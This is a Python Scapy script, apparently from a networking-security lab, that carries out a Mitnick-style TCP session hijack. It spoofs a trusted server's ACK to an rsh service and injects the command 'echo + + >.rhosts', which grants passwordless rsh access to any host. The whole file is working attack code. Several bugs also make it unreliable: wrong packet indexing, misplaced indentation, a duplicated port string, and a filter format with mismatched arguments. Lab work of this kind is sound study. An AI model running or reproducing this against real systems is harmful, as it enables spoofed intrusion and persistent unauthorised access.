from scapy.all import *
from scapy.layers.inet import IP, TCP
import time
x_ip='10.9.0.5'
srv_ip='10.9.0.6'
x_port=514
srv_port=1023
srv_port2=9090
syn_seq=0x1000
# Spoof the ACK to finish 3-way handshake initialized by the attacker
#after that , spoof a rsh data packet
# we are only allowed to use the sequence number in the captured packet

def spoof(pkt):
    old_tcp=pkt(TCP)
    if old_tcp.flags=='SA':
        # spoof ACK to finish the handshake protocol
        ip=IP(src=srv_ip,dst=x_ip)
        tcp=TCP(sport=srv_port,dport=x_port,seq=syn_seq+1,ack=old_tcp.seq+1,flags='A')
    print('{}-->{} spoofing ACK'.format(tcp.sport,tcp.dport))
    send(ip/tcp, verbose=0)
    #send rsh command to x-Terminal
    tcp.flags="PA"
    #data=str(srv_port2)+'x00seed\x00seed\x00touch /tmp/xyz\x00’
    data = str(srv_port2)+'9090\x00seed\x00seed\x00echo + + >.rhosts\x00'
    print(f'Sending data: {data}')  
    send(ip/tcp/data,verbose=0)
    # Reset the connection after 2 seconds
    # This is not necessary . we did this, so we can repeat the attack.
    time.sleep(2)
    tcp.flags='R'
    tcp.seq=syn_seq+1+len(data)
    print(f' {tcp.sport}-->{tcp.dport} Reseting connection')
    send(ip/tcp,verbose=0)
f='tcp and src host {}  and src port {} and dst port {}'
myfilter=f.format(x_ip,x_port,srv_ip,srv_port)
sniff(iface='eth0',filter=myfilter,prn=spoof)
